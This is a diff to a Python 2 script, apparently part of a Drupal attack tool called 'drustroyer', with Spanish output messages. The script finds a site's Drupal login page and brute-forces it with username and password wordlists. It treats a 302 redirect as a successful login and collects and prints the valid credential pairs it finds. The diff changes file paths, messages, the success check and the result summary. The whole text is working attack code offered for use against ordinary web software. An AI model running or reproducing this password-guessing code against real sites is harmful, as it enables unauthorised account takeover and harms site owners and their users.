@@ -17,18 +17,18 @@ import requests
 import sys
 import os
 import re
+import colors
 
-usrlist = [line.rstrip('\n') for line in open(os.getcwd()+'/script/dependencias/usuarios.txt')]
-pswlist = [line.rstrip('\n') for line in open(os.getcwd()+'/script/dependencias/passwords.txt')]
+usrlist = [line.rstrip('\n') for line in open('/opt/drustroyer/script/dependencias/usuarios.txt')]
+pswlist = [line.rstrip('\n') for line in open('/opt/drustroyer/script/dependencias/passwords.txt')]
 
 req,target = sys.argv[1],sys.argv[2]
 if req.get(target+'/user/login').status_code == 200 and 'password' in req.get(target+'/user/login').text:
-	print colors.green('\n[**] ')+"Pagina para ingreso de usuarios:\n\t %s/user/login\n"%target
+	print colors.green('\n[=>>] ')+"Se probara en:\n\t %s/user/login\n"%target
 	url = target+'/user/login'
 elif req.get(target+'/?q=user/login').status_code == 200 and 'password' in req.get(target+'/?q=user/login').text:
-	print colors.green('\n[**] ')+"Pagina para ingreso de usuarios:\n\t %s/?q=user/login\n"%target
+	print colors.green('\n[=>>] ')+"Se probara en:\n\t %s/?q=user/login\n"%target
 	url = target+'/?q=user/login'
-
 ValidCredentials =[]
 for user in usrlist:
 	for pwd in pswlist:
@@ -41,10 +41,15 @@ for user in usrlist:
 			print msg
 		try:
 			if html.history:
-				if html.history[0].status_code in range(299,404):
+				if html.history[0].status_code in [302]:
 					ValidCredentials.append([user,pwd])
 					req.cookies.clear()
 		except Exception as e:
 			print e
-for d in ValidCredentials:
-	print "Credenciales validas halladas: "+d[0]+" "+d[1];
+if ValidCredentials:
+	retorno = 'Credenciales validas halladas\n'
+	for d in ValidCredentials:
+		print "Credenciales validas halladas: "+d[0]+" "+d[1];
+		retorno += "USER: "+d[0]+" PASS:"+d[1]+'\n'
+elif not ValidCredentials:
+	retorno = 'NO SE HALLARON CREDENCIALES VALIDAS.'
